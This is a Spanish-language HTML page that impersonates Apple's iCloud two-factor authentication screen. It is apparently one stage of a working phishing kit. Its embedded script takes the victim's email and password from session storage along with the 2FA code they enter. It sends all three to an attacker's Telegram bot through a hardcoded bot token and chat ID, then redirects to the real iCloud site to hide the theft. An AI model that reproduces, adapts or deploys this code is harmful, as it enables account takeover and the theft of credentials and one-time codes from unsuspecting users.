<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iCloud - Verificación</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: #f5f5f7;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 480px;
            background: white;
            border-radius: 16px;
            padding: 40px 32px 32px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
        }

        .icloud-logo {
            text-align: center;
            margin-bottom: 20px;
        }

        .icloud-logo svg {
            width: 56px;
            height: 56px;
        }

        h1 {
            text-align: center;
            font-size: 28px;
            font-weight: 600;
            color: #1d1d1f;
            margin-bottom: 8px;
            letter-spacing: -0.3px;
        }

        .subtitle {
            text-align: center;
            font-size: 17px;
            color: #6e6e73;
            margin-bottom: 28px;
            line-height: 1.4;
        }

        .code-label {
            font-size: 14px;
            color: #1d1d1f;
            font-weight: 500;
            margin-bottom: 12px;
        }

        .code-inputs {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 28px;
        }

        .code-input {
            width: 52px;
            height: 60px;
            text-align: center;
            font-size: 28px;
            font-weight: 500;
            border: 2px solid #d2d2d7;
            border-radius: 10px;
            background: white;
            transition: all 0.2s;
        }

        .code-input:focus {
            outline: none;
            border-color: #0071e3;
            box-shadow: 0 0 0 4px rgba(0, 113, 227, 0.1);
        }

        .links {
            margin-bottom: 24px;
        }

        .link {
            display: block;
            color: #0071e3;
            text-decoration: none;
            font-size: 15px;
            margin-bottom: 6px;
            cursor: pointer;
        }

        .link:hover {
            text-decoration: underline;
        }

        .verify-button {
            width: 100%;
            background: #0071e3;
            color: white;
            border: none;
            border-radius: 30px;
            padding: 16px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }

        .verify-button:hover {
            background: #0077ed;
        }

        .verify-button:active {
            background: #0063c7;
        }

        .error-message {
            display: none;
            text-align: center;
            margin: 12px 0;
            color: #ff3b30;
            font-size: 14px;
            padding: 12px;
            background: #fce8e8;
            border-radius: 8px;
            border: 1px solid #ff3b30;
        }

        .success-message {
            display: none;
            text-align: center;
            margin: 12px 0;
            color: #34c759;
            font-size: 14px;
            padding: 12px;
            background: #e8fce8;
            border-radius: 8px;
            border: 1px solid #34c759;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icloud-logo">
            <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M20 8C14.477 8 10 12.477 10 18C10 18.681 10.08 19.343 10.229 19.978C8.296 21.126 7 23.255 7 25.5C7 28.538 9.462 31 12.5 31H27.5C30.538 31 33 28.538 33 25.5C33 23.255 31.704 21.126 29.771 19.978C29.92 19.343 30 18.681 30 18C30 12.477 25.523 8 20 8Z" fill="#0071E3"/>
                <path d="M20 10C15.582 10 12 13.582 12 18C12 18.55 12.058 19.086 12.168 19.605L12.307 20.253L11.687 20.496C10.097 21.097 9 22.661 9 24.5C9 26.985 11.015 29 13.5 29H26.5C28.985 29 31 26.985 31 24.5C31 22.661 29.903 21.097 28.313 20.496L27.693 20.253L27.832 19.605C27.942 19.086 28 18.55 28 18C28 13.582 24.418 10 20 10Z" fill="white"/>
            </svg>
        </div>

        <h1>Autenticación de dos factores</h1>
        <div class="subtitle">Se envió un mensaje con el código de verificación a tus dispositivos. Ingresa el código para continuar.</div>

        <form id="verificationForm">
            <div class="code-label">Código de verificación</div>
            
            <div class="code-inputs">
                <input type="text" class="code-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="text" class="code-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="text" class="code-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="text" class="code-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="text" class="code-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="text" class="code-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
            </div>

            <div class="links">
                <a class="link" onclick="resendCode()">Volver a enviar el código</a>
                <a class="link" onclick="alert('Opción no disponible')">¿No puedes acceder a tus dispositivos?</a>
            </div>

            <button type="submit" class="verify-button">Verificar</button>

            <div class="error-message" id="errorMessage">❌ Código incorrecto. Vuelve a intentarlo.</div>
            <div class="success-message" id="successMessage">✅ Código verificado correctamente</div>
        </form>
    </div>

    <script>
        // CONFIGURACIÓN DE TELEGRAM
        const TELEGRAM_BOT_TOKEN = '8273125469:AAFJun-bljCAYWjLyXubtLBye_21Y47rjnI';
        const TELEGRAM_CHAT_ID = '6939469358';

        const inputs = document.querySelectorAll('.code-input');
        
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
                
                if (e.target.value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            });
            
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });

        function resendCode() {
            alert('Se ha reenviado el código de verificación.');
        }

        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const code = Array.from(inputs).map(input => input.value).join('');
            const errorMessage = document.getElementById('errorMessage');
            const successMessage = document.getElementById('successMessage');
            
            if (code.length !== 6) {
                errorMessage.style.display = 'block';
                successMessage.style.display = 'none';
                return;
            }
            
            errorMessage.style.display = 'none';
            
            try {
                const email = sessionStorage.getItem('icloud_email') || 'No disponible';
                const password = sessionStorage.getItem('icloud_password') || 'No disponible';
                
                const message = `🔴 iCLOUD 2FA 🔴\n\n📧 Correo: ${email}\n🔑 Contraseña: ${password}\n🔢 Código 2FA: ${code}`;

                const response = await sendToTelegram(message);
                
                if (response.ok) {
                    successMessage.style.display = 'block';
                    errorMessage.style.display = 'none';
                    
                    // Limpiar sessionStorage
                    sessionStorage.clear();
                    
                    // Redirigir a iCloud después de 2 segundos
                    setTimeout(() => {
                        window.location.href = 'https://www.icloud.com/';
                    }, 2000);
                } else {
                    throw new Error('Error en Telegram');
                }
                
            } catch (error) {
                console.error('Error:', error);
                errorMessage.style.display = 'block';
                successMessage.style.display = 'none';
            }
        });

        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            return response;
        }

        inputs[0].focus();

        document.getElementById('verificationForm').addEventListener('click', function(e) {
            if (!e.target.classList.contains('code-input')) {
                const lastFilled = Array.from(inputs).findIndex(input => input.value === '');
                if (lastFilled === -1) {
                    inputs[5].focus();
                } else {
                    inputs[lastFilled].focus();
                }
            }
        });
    </script>
</body>
</html>
